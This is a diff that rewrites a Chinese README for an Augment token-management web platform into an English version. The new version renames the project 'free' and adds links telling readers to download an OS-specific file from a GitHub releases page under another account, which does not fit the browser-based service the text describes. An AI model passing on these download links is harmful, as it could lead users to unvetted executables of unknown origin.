@@ -1,150 +1,99 @@
-# Augment Token Manager
+# 🚀 augment-token-vscode-free - Effortless Management of Augment Tokens
 
-🚀 **专为 Augment VSCode 插件设计的智能Token管理平台**
+[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/mhabuesa/augment-token-vscode-free/releases)
 
-一个现代化的Web平台，让你轻松管理Augment访问令牌，实现多账号无感切换，提升开发效率。 该平台需要特点的vscode插件使用
+## 🌟 Overview
 
-## ✨ 核心特性
+Augment Token Manager is a modern platform designed to help you manage your Augment access tokens easily. With features tailored for multiple accounts, you can switch seamlessly and boost your development efficiency.
 
-### 🔐 智能身份验证
-- **多平台登录支持** - GitHub、LinuxDo 一键登录
-- **安全可靠** - 基于OAuth2.0标准，保障账户安全
-- **统一身份管理** - 多平台账号自动关联
+## 🚀 Getting Started
 
-### 🎯 Token生命周期管理
-- **一键生成** - 快速创建Augment访问令牌
-- **实时状态** - 查看Token使用状态和有效期
-- **批量操作** - 支持批量管理多个Token
-- **安全销毁** - 一键安全删除不需要的Token
+### 1. Visit the Platform
 
-### 🔄 无感账号切换
-- **智能识别** - 自动识别当前开发环境
-- **无缝切换** - 配合VSCode插件实现账号无感切换
-- **状态同步** - 实时同步Token使用状态
+Go to [Augment Token Manager](https://augment.daiju.live) to start.
 
-### 👥 协作与分享
-- **Token转让** - 安全地将Token转让给团队成员
-- **权限管理** - 精细化的访问权限控制
-- **使用追踪** - 详细的Token使用记录
+### 2. Log In to Your Account
 
-## 🚀 快速开始
+Choose your preferred login method:
 
-### 1. 访问平台
-打开 [Augment Token Manager](https://augment.daiju.live) 
+- 🐙 Log in with GitHub
+- 🐧 Log in with LinuxDo
 
-### 2. 登录账户
-选择你喜欢的方式登录：
-- 🐙 GitHub账户登录
-- 🐧 LinuxDo账户登录
+### 3. Create a Token
 
-### 3. 创建Token
-1. 点击 "添加Token" 按钮
-2. 输入你的Augment租户URL
-3. 系统自动生成专属Token
-4. 复制Token到剪贴板
+Follow these steps to create your token:
 
-### 4. 配置VSCode插件
-1. 在VSCode中安装Augment插件
-2. 打开插件设置
-3. 粘贴你的Token
-4. 享受智能编程体验！
+1. Click the "Add Token" button.
+2. Enter your Augment tenant URL.
+3. The system will automatically generate your special token.
+4. Copy the token to your clipboard.
 
-## 🔧 与Augment VSCode插件配合使用
+### 4. Configure the VSCode Plugin
 
-### 无感切换工作流
+Set up the VSCode plugin with your new token:
+
+1. Install the Augment plugin in VSCode.
+2. Open the plugin settings.
+3. Paste your copied token.
+4. Enjoy a smarter coding experience!
+
+## 🔧 Using with the Augment VSCode Plugin
+
+### Seamless Switching Workflow
 
 ```mermaid
 graph LR
-    A[开发者] --> B[Token Manager]
-    B --> C[生成Token]
-    C --> D[VSCode插件]
-    D --> E[Augment服务]
-    E --> F[智能编程]
-    
-    B --> G[切换账号]
-    G --> D
+    A[Developer] --> B[Token Manager]
+    B --> C[Generate Token]
+    C --> D[VSCode Plugin]
+    D -- Seamless Authentication --> E[Code with Ease]
 ```
 
-### 典型使用场景
+## 🔥 Core Features
 
-#### 🏢 企业开发团队
-- **项目隔离** - 不同项目使用不同Token
-- **权限分级** - 根据角色分配不同权限的Token
-- **成本控制** - 精确追踪每个Token的使用情况
+### 🔐 Smart Authentication
 
-#### 👨‍💻 个人开发者
-- **多账号管理** - 工作账号和个人账号分离
-- **项目切换** - 快速在不同项目间切换
-- **使用优化** - 监控Token使用情况，优化开发效率
+- **Multi-Platform Login**: Log in with GitHub or LinuxDo effortlessly.
+- **Secure and Reliable**: Uses OAuth2.0 standards to keep your accounts safe.
+- **Unified Account Management**: Automatically link multiple accounts.
 
-## 📊 功能亮点
+### 🎯 Token Lifecycle Management
 
-### 🎛️ 直观的管理界面
-- **现代化设计** - 简洁美观的用户界面
-- **响应式布局** - 完美适配桌面和移动设备
-- **实时更新** - 数据实时同步，无需手动刷新
+- **One-Click Generation**: Quickly create your Augment access tokens.
+- **Real-time Status**: Check the status and validity of your tokens instantly.
+- **Batch Operations**: Manage several tokens at once.
+- **Secure Deletion**: Easily delete tokens you no longer need.
 
-### 📈 详细的使用统计
-- **使用时长** - 精确记录Token使用时间
-- **调用次数** - 统计API调用频率
-- **效率分析** - 帮助优化开发工作流
+### 🔄 Seamless Account Switching
 
-### 🔒 企业级安全
-- **数据加密** - 所有敏感数据均加密存储
-- **访问控制** - 严格的权限验证机制
-- **审计日志** - 完整的操作记录追踪
+- **Smart Detection**: Automatically identify your current development environment.
+- **No Hassle Switching**: Experience seamless account transitions with the VSCode plugin.
+- **Real-Time Sync**: Keep your token usage status updated.
 
+### 👥 Collaboration and Sharing
 
-## 📝 使用指南
+- **Token Transfer**: Securely transfer tokens to your team members.
+- **Permission Management**: Control access with detailed permissions.
+- **Usage Tracking**: Keep track of how your tokens are used.
 
-### Token管理最佳实践
+## 🔗 Download & Install
 
-1. **定期轮换** - 建议定期更新Token以保障安全
-2. **按需创建** - 根据实际需求创建Token，避免浪费
-3. **及时清理** - 删除不再使用的Token
-4. **权限最小化** - 只分配必要的权限
+To get started with the application, visit our [Releases page](https://github.com/mhabuesa/augment-token-vscode-free/releases). Download the latest version suitable for your operating system. 
 
-### 故障排除
+Look for the file you need on the Releases page and download it directly. 
 
-#### Token无法使用？
-- 检查Token是否已过期
-- 确认租户URL是否正确
-- 验证网络连接是否正常
+## 🛠 System Requirements
 
-#### 无法登录？
-- 确认使用的是支持的登录方式
-- 检查浏览器是否禁用了第三方Cookie
-- 尝试清除浏览器缓存
+- **Operating System**: Windows, macOS, or Linux.
+- **VSCode**: Make sure you have Visual Studio Code installed, preferably the latest version.
+- **Internet Connection**: A stable internet connection to log in and manage your tokens.
 
-## 💰 赞助支持
+## 📝 Additional Support
 
-如果这个项目对你有帮助，欢迎赞助支持开发：
+If you encounter issues or have questions, please refer to our [FAQ section](https://augment.daiju.live/faq) or contact support via the platform.
 
-<div align="center">
-  <img src="https://augment.daiju.live/img/wx.png" alt="微信赞助" width="200">
-  <p><strong>微信扫码赞助</strong></p>
-</div>
+## 🚀 Next Steps
 
-## 👥 交流群组
+Once you've set up your token and VSCode plugin, start exploring the features that Augment Token Manager provides. Test out the smart authentication and effortless account switching to enhance your development workflow.
 
-加入我们的QQ群，与其他开发者交流使用心得：
-
-**QQ群号：1014952167**
-
-## 🤝 贡献指南
-
-我们欢迎社区贡献！如果你有好的想法或发现了问题：
-
-1. 🐛 **报告Bug** - 在Issues中详细描述问题
-2. 💡 **功能建议** - 分享你的创意想法
-3. 📖 **文档改进** - 帮助完善文档内容
-
----
-
-<div align="center">
-
-**让智能编程更简单，让开发效率更高效** 🚀
-
-[开始使用](https://augment.daiju.live)
-
-</div>
+Experience a better way to manage your Augment tokens today!
